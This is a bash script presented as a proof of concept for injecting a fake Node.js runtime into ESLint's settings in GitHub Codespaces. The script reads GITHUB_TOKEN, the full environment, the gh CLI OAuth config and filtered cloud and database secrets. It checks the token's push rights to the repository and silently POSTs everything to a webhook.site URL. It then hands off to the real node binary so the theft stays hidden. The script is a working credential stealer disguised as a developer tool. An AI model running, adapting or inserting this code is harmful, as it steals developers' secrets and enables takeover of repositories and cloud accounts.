#!/bin/bash
# ESLint runtime proxy — PoC for GitHub Codespaces eslint.runtime injection
# Stage 1: exfiltrate credentials and prove write access to base repo
# Stage 2: proxy transparently to real Node.js so ESLint keeps working

WEBHOOK="https://webhook.site/aa3a43f4-a664-449a-a441-ddd5defe240c"

exfil() {
    local GITHUB_TK="${GITHUB_TOKEN:-NOT_SET}"
    local REPO="${GITHUB_REPOSITORY:-unknown}"
    local ACTOR="${GITHUB_ACTOR:-unknown}"

    # Full environment dump — captures GITHUB_TOKEN, CODESPACES_USER_SECRET_*, etc.
    local ENV_DUMP
    ENV_DUMP=$(env 2>/dev/null | base64 -w0 2>/dev/null || env 2>/dev/null | base64 2>/dev/null)

    # gh CLI config file — contains the user's personal OAuth token if gh auth login was run
    local GH_CLI_CONFIG
    GH_CLI_CONFIG=$(cat "${HOME}/.config/gh/hosts.yml" 2>/dev/null | base64 -w0 2>/dev/null || echo "")
    # High-value subset — secrets, tokens, cloud credentials filtered for fast triage
    local SECRETS_DUMP
    SECRETS_DUMP=$(env 2>/dev/null \
        | grep -iE "SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|AWS|AZURE|GCP|CLOUD|NPM|DB_|DATABASE" \
        | base64 -w0 2>/dev/null || echo "")

    # Check whether GITHUB_TOKEN has push (write) access to the base repo.
    # If true, the attacker can inject a commit that triggers Actions with production secrets.
    local PUSH_ACCESS="unknown"
    local REPO_PERMISSIONS
    if [ -n "$GITHUB_TOKEN" ] && [ -n "$REPO" ] && [ "$REPO" != "unknown" ]; then
        REPO_PERMISSIONS=$(curl -sk --max-time 5 \
            -H "Authorization: Bearer ${GITHUB_TOKEN}" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${REPO}" 2>/dev/null)
        PUSH_ACCESS=$(echo "${REPO_PERMISSIONS}" \
            | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('permissions',{}).get('push', False))"
\
            2>/dev/null || echo "unknown")
    fi
    # Send everything to the webhook in a single POST
    curl -sk \
        --max-time 8 \
        -X POST "${WEBHOOK}" \
        -H "Content-Type: application/json" \
        -d "{
            \"finding\": \"eslint.runtime injection — GitHub Codespaces\",
            \"repo\": \"${REPO}\",
            \"actor\": \"${ACTOR}\",
            \"github_token\": \"${GITHUB_TK}\",
            \"token_push_access_to_base_repo\": \"${PUSH_ACCESS}\",
            \"env_b64\": \"${ENV_DUMP}\",
            \"gh_cli_config_b64\": \"${GH_CLI_CONFIG}\",
            \"secrets_b64\": \"${SECRETS_DUMP}\"
        }" &>/dev/null &

    disown
}

exfil

# Hand off to the real Node.js binary — ESLint server starts normally, no visible anomaly
REAL_NODE=$(command -v node 2>/dev/null || echo "/usr/local/bin/node")
exec "${REAL_NODE}" "$@" 2>/dev/null
